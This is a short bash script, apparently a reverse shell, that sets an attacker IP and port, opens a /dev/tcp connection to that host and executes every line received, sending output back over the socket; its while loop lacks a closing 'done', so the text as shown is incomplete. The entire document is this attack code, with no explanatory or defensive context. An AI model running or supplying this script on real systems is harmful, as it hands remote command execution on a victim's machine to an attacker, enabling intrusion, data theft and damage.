#!/usr/bin/env bash


attacker_ip=192.168.1.2
attacker_port=8080

exec 5<>/dev/tcp/$attacker_ip/$attacker_port
cat <&5 | while read line; do $line 2>&5 >&5;

